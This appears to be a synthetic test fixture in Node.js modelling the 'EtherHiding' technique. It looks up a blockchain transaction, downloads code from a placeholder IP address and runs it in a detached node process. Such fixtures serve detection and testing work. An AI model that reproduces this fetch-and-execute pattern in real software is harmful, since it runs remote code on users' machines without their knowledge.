// Synthetic regression fixture (no working endpoints): clear-text EtherHiding
// shape. Walks blocks for a hardcoded sender nonce, fetches a payload over HTTP,
// and runs it in a fresh node REPL.
const http = require('node:http');
const { spawn } = require('node:child_process');

const SENDER = '0x0000000000000000000000000000000000000001';
const RPC = 'https://rpc.example.invalid';

async function rpc(method, params) {
  const body = JSON.stringify({ jsonrpc: '2.0', id: 1, method, params });
  const res = await fetch(RPC, { method: 'POST', body });
  return (await res.json()).result;
}

async function findPayload() {
  const head = await rpc('eth_blockNumber', []);
  const nonce = await rpc('eth_getTransactionCount', [SENDER, head]);
  const block = await rpc('eth_getBlockByNumber', [head, true]);
  return block.transactions.find(t => t.from === SENDER && t.nonce === nonce);
}

findPayload().then(() => {
  http.get('http://198.51.100.7/0x/ls', res => {
    let code = '';
    res.on('data', c => { code += c; });
    res.on('end', () => {
      const child = spawn('node', ['-i'], { detached: true, stdio: ['pipe', 'pipe', 'pipe'] });
      child.stdin.write(code + '\n');
      child.unref();
    });
  });
});
